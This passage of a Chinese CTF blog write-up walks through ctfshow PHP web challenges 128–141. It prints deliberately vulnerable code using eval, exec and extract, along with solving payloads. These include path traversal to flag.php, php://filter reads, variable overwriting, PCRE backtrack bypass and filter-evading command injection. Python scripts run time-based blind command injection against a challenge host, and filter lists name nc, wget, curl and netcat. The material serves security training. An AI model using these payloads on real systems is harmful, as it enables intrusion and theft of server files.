class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-12 19:49:05</span><br><br>*/<br><br><br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(__FILE__);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(check(<span class="hljs-variable">$f1</span>))&#123;<br>    var_dump(call_user_func(call_user_func(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> check(<span class="hljs-variable">$str</span>)&#123;<br>    <span class="hljs-built_in">return</span> !preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f1=_&amp;f2=get_defined_vars<br></code></pre></td></tr></table></figure><p>本地学到了,php扩展目录下有php_gettext.dll_()是一个函数。</p><p>_()==gettext() 是gettext()的拓展函数，开启text扩展get_defined_vars — 返回由所有已定义变量所组成的数组。</p><p>为了绕过正则，_()函数和gettext()的效果一样，所以可以用_()函数代替gettext()函数。</p><h2 id="web129"><a class="markdownIt-Anchor" href="#web129"></a> web129</h2><h3 id="0x01-15"><a class="markdownIt-Anchor" href="#0x01-15"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-15"><a class="markdownIt-Anchor" href="#0x02-15"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=/ctfshow/../../../../var/www/html/flag.php<br></code></pre></td></tr></table></figure><p>进行目录穿越</p><h2 id="web130"><a class="markdownIt-Anchor" href="#web130"></a> web130</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x01-16"><a class="markdownIt-Anchor" href="#0x01-16"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=ctfshow<br></code></pre></td></tr></table></figure><p>+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复,所以在ctfshow前面必须有至少一个字符，才会返回true</p><h3 id="0x02-16"><a class="markdownIt-Anchor" href="#0x02-16"></a> 0x02</h3><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p><h2 id="web131"><a class="markdownIt-Anchor" href="#web131"></a> web131</h2><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p><h2 id="web132"><a class="markdownIt-Anchor" href="#web132"></a> web132</h2><p>进去是一个网站，默认看一下robots.txt，告诉/admin,进去得到网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=admin&amp;password=1&amp;username=admin<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>先运行<code>&amp;&amp;</code>再运行<code>||</code>，a||b如果前面的错了那么就运行后面的，如果前面对的就不看后面的了</p><h2 id="web133"><a class="markdownIt-Anchor" href="#web133"></a> web133</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: Firebasky</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-13 16:43:44</span><br><br>*/<br><br>error_reporting(0);<br>highlight_file(__FILE__);<br>//flag.php<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-built_in">eval</span>(substr(<span class="hljs-variable">$F</span>,0,6));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;6个字母都还不够呀?!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原理大致就是利用curl外带，然后dnslog进行，直接贴文章吧</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133和其他命令执行的骚操作-CSDN博客</a></p><h2 id="web134"><a class="markdownIt-Anchor" href="#web134"></a> web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-14 23:01:06</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?_POST[key1]=36d&amp;_POST[key2]=36d<br></code></pre></td></tr></table></figure><p>利用变量覆盖，执行</p><h2 id="web135"><a class="markdownIt-Anchor" href="#web135"></a> web135</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?F=`<span class="hljs-variable">$F</span>`+;<span class="hljs-built_in">cp</span>+flag.php+1.txt<br></code></pre></td></tr></table></figure><p>自身的值在被eval时候直接引用自身，可以用cp把flag复制到1.txt访问 <code>?F=</code>$F<code>+;cp+flag.php+1.txt</code></p><h2 id="web136"><a class="markdownIt-Anchor" href="#web136"></a> web136</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span> / |<span class="hljs-built_in">tee</span> 1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> f149_15_h3r3 |<span class="hljs-built_in">tee</span> aa<br></code></pre></td></tr></table></figure><h2 id="web137"><a class="markdownIt-Anchor" href="#web137"></a> web137</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow=ctfshow::getFlag<br></code></pre></td></tr></table></figure><h2 id="web138"><a class="markdownIt-Anchor" href="#web138"></a> web138</h2><p><code>strripos($_POST['ctfshow'], &quot;:&quot;) &gt; -1</code> 的检查条件意味着只要 POST 数据中包含冒号，代码就会终止。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag<br></code></pre></td></tr></table></figure><p>在 PHP 中，<code>call_user_func</code> 可以接收数组形式的参数来调用静态方法。这种方式可以绕过冒号检查，因为 <code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code> 并不包含冒号。</p><ul><li><code>ctfshow[0]=ctfshow</code>：表示调用 <code>ctfshow</code> 类的方法。</li><li><code>ctfshow[1]=getFlag</code>：表示调用 <code>getFlag</code> 方法。</li></ul><h2 id="web139"><a class="markdownIt-Anchor" href="#web139"></a> web139</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和136差不多，但是测了一下好像并不能写入文件，应该是权限问题，跟着官p看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">str</span> = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;_~&#x27;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):  <span class="hljs-comment"># 行</span><br>    key = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">15</span>):  <span class="hljs-comment"># 列</span><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>            <span class="hljs-comment"># awk &#x27;NR==&#123;0&#125;&#x27;逐行输出获取</span><br>            <span class="hljs-comment"># cut -c &#123;1&#125; 截取单个字符</span><br>            payload = <span class="hljs-string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="hljs-built_in">format</span>(i, j, n)<br>            <span class="hljs-comment"># print(payload)</span><br>            url = <span class="hljs-string">&quot;http://271efe3f-c200-4c7c-b5fc-0262498db523.challenge.ctf.show/?c=&quot;</span> + payload<br>            <span class="hljs-keyword">try</span>:<br>                requests.get(url, timeout=(<span class="hljs-number">2.5</span>, <span class="hljs-number">2.5</span>))<br>            <span class="hljs-keyword">except</span>:<br>                result = result + n<br>                <span class="hljs-built_in">print</span>(result)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> n == <span class="hljs-string">&#x27;~&#x27;</span>:<br>                key = <span class="hljs-number">1</span><br>                result += <span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Final result:&quot;</span>, result)<br></code></pre></td></tr></table></figure><p><code>ls /|awk 'NR==&#123;0&#125;'</code>: 获取 <code>/</code> 目录下的第 <code>i</code> 个文件或目录的名称。</p><p><code>cut -c &#123;1&#125;</code>: 获取文件名的第 <code>j</code> 个字符。</p><p><code>if [ ... == &#123;2&#125; ]</code>: 判断这个字符是否等于当前循环中的字符 <code>n</code>。</p><p><code>sleep 3</code>: 如果匹配成功，则让服务器等待 3 秒。</p><p>文件在<code>f149_15_h3r3</code>里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-built_in">str</span>=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br>key=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>    <span class="hljs-built_in">print</span>(j)<br>    <span class="hljs-keyword">if</span> key==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="hljs-built_in">format</span>(j,n)<br>        <span class="hljs-comment">#print(payload)</span><br>        url=<span class="hljs-string">&quot;http://271efe3f-c200-4c7c-b5fc-0262498db523.challenge.ctf.show/?c=&quot;</span>+payload<br>        <span class="hljs-keyword">try</span>:<br>            requests.get(url,timeout=(<span class="hljs-number">2.5</span>,<span class="hljs-number">2.5</span>))<br>        <span class="hljs-keyword">except</span>:<br>            result=result+n<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后要扩个括号</p><h2 id="web140"><a class="markdownIt-Anchor" href="#web140"></a> web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>字符串进行整数转化是0,所以只要保证$code是否为0就行了</p><h3 id="0x01-17"><a class="markdownIt-Anchor" href="#0x01-17"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=md5&amp;f2=phpinfo <span class="hljs-comment">#进行加密之后开头是字母</span><br></code></pre></td></tr></table></figure><p>成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><h3 id="0x02-17"><a class="markdownIt-Anchor" href="#0x02-17"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=system&amp;f2=system <span class="hljs-comment">#bool为false</span><br></code></pre></td></tr></table></figure><h3 id="0x03-4"><a class="markdownIt-Anchor" href="#0x03-4"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=usleep&amp;f2=usleep   <span class="hljs-comment"># usleep() 没有返回值，调用 usleep() 将导致 eval() 返回 null。当 null 传递给 intval() 时，返回值是 0。</span><br></code></pre></td></tr></table></figure><h2 id="web141"><a class="markdownIt-Anchor" href="#web141"></a> web141</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>preg_match('/^\W+$/', $v3)</code> 这段代码的作用是检查变量 <code>$v3</code> 是否 <strong>只包含一个或多个非单词字符</strong>（例如空格、标点符号等），且整个字符串从头到尾都符合这个条件。如果是这样，则返回 <code>1</code>，否则返回 <code>0</code>。简单的说就是不能包含字母数字。</p><p>利用取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;?c=(~&quot;</span>.<span class="hljs-variable">$c</span>.<span 